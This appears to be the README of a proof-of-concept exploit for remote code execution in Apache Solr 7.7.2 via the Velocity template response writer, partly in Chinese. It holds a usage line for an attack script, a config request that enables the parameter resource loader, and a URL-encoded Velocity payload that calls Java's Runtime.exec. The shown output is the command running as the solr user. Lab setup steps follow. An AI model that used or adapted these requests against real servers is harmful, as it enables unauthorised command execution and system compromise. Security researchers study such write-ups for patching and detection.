# Apache Solr RCE via Velocity template

## python usage:

`python solr_rce.py http://192.168.5.86:8983 command`


![](./solr-rce.jpg)

## Attack start


1. Set `params.resource.loader.enabled` as true.

```
Request:
========================================================================
POST /solr/test/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
========================================================================
```

2. RCE via velocity template

```
Request:
========================================================================
GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: localhost:8983
========================================================================


Response:
========================================================================
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 56

     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
========================================================================
```

## 漏洞环境搭建

`https://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2`

`https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/7.7.2/solr-7.7.2.zip`

#### velocity.solr.resource.loader.enabled:true

`/opt/solr-7.7.2/example/example-DIH/solr/atom/conf/solrconfig.xml`

```
root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf# cat solrconfig.xml | grep enable
    <enableLazyFieldLoading>true</enableLazyFieldLoading>
    <str name="solr.resource.loader.enabled">${velocity.solr.resource.loader.enabled:true}</str>
    <str name="params.resource.loader.enabled">${velocity.params.resource.loader.enabled:false}</str>
root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf#
```

## 参考链接：

https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
